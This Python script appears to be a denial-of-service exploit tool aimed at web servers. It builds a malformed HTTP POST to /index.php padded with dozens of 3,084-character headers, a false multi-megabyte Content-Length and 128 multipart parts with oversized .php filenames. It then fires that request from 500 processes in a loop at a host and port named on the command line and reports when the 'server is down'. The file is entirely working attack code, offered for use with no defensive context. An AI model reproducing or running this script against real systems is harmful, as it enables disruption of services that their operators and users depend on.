import argparse
import socket
import time
import multiprocessing
from multiprocessing import Process
from socket import error as socket_error

def gen_packet(host):
	packet = 'POST /index.php HTTP/1.1\r\n'
	packet += 'Host: ' + host + '\r\n'
	packet += 'User-Agent: Mozila/5.0\r\n'
	packet += 'Accept: */*\r\n'
	packet += 'Content-Type: multipart/form-data; boundary=---------------------------32917364219558108233580962733\r\n'
	packet += 'Connection: keep-alive\r\n'
	packet += 'Content-Length: 8122000\r\n'
	packet += 'Origin: http://' + 'A' * 3084 + '\r\n'
	for i in range(92):
		packet += 'AdvancedHeaderName' + str(i) + ':' + 'A' *  3084 + '\r\n'
	packet += 'Referer: http://' + 'A' * 3084 + '\r\n\r\n'
	for i in range(128):
		packet += '-----------------------------32917364219558108233580962733\r\n'
		packet += 'Content-Disposition: form-data; name="user_file_name' + str(i) + '"; filename="' + str(i) + 'A' * 6144 + '.php"\r\n'
		packet += 'Content-Type: application/x-php\r\n\r\n'
	return packet

def send_packet(host,packet,port):
	try:
		sock = socket.socket()
		try:
			sock.connect((host, port))
		except socket_error:
			return_dict[0]="refused"
		else:
			sock.send(packet.encode())
			try:
				sock.recv(1024).decode()
			except KeyboardInterrupt:
				return 'killed'
			except socket_error:
				return_dict[0]="down"
	except KeyboardInterrupt:
		exit(0)
if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('host', action='store', type=str, help='RHOST to send "bad packets"')
	parser.add_argument('-p', '--port', default="80", action='store', type=int, help='RPORT to send "bad packets"')
	args = parser.parse_args()
	packet=gen_packet(args.host)
	return_dict = multiprocessing.Manager().dict()
	while True:
		try:
			print ('[*] Sending bad http packet')
			for i in range(500):
				proc = Process(target=send_packet, args=(args.host,packet,args.port,))
				proc.start()
				if len(return_dict.values())==1 and return_dict.values()[0]=="refused":
					print ('[!] Server refused request')
					time.sleep(1)
					exit(0)
				elif len(return_dict.values())==1 and return_dict.values()[0]=="down":
					print ('[+] Server is down')
					time.sleep(600)
		except KeyboardInterrupt:
			print ('\nExit...')
			exit(0)
